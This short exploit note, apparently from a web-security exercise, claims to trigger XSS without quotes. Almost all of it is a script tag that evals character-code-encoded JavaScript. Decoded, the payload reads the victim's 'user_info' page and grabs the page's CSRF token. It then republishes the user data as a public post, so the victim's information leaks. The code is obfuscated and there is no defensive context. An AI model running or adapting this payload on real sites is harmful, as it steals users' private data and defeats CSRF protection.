The following exploit will cause the XSS, no quotes used.

<script language=javascript>eval(String.fromCharCode(36, 46, 103, 101, 116, 40, 34, 117, 115, 101, 114, 95, 105, 110, 102, 111, 34, 44, 32, 102, 117, 110, 99, 116, 105, 111, 110, 40, 114, 101, 115, 117, 108, 116, 41, 123, 10, 32, 32, 32, 32, 118, 97, 114, 32, 100, 97, 116, 97, 32, 61, 32, 36, 40, 114, 101, 115, 117, 108, 116, 41, 46, 102, 105, 110, 100, 40, 39, 116, 100, 39, 41, 46, 116, 101, 120, 116, 40, 41, 59, 10, 32, 32, 32, 32, 118, 97, 114, 32, 99, 115, 114, 102, 95, 116, 111, 107, 101, 110, 32, 61, 32, 100, 111, 99, 117, 109, 101, 110, 116, 46, 102, 111, 114, 109, 115, 91, 48, 93, 46, 101, 108, 101, 109, 101, 110, 116, 115, 91, 34, 95, 99, 115, 114, 102, 34, 93, 46, 118, 97, 108, 117, 101, 59, 10, 32, 32, 32, 32, 118, 97, 114, 32, 114, 101, 112, 108, 97, 99, 101, 100, 32, 61, 32, 100, 97, 116, 97, 46, 114, 101, 112, 108, 97, 99, 101, 40, 47, 94, 92, 119, 47, 103, 44, 32, 34, 88, 88, 88, 34, 41, 59, 10, 32, 32, 32, 32, 36, 46, 112, 111, 115, 116, 40, 34, 97, 106, 97, 120, 47, 112, 111, 115, 116, 115, 34, 44, 32, 123, 32, 116, 105, 116, 108, 101, 58, 32, 34, 84, 72, 73, 83, 34, 44, 32, 98, 111, 100, 121, 58, 32, 114, 101, 112, 108, 97, 99, 101, 100, 44, 32, 95, 99, 115, 114, 102, 58, 32, 99, 115, 114, 102, 95, 116, 111, 107, 101, 110, 32, 125, 32, 41, 59, 10, 125, 41, 59))</script>
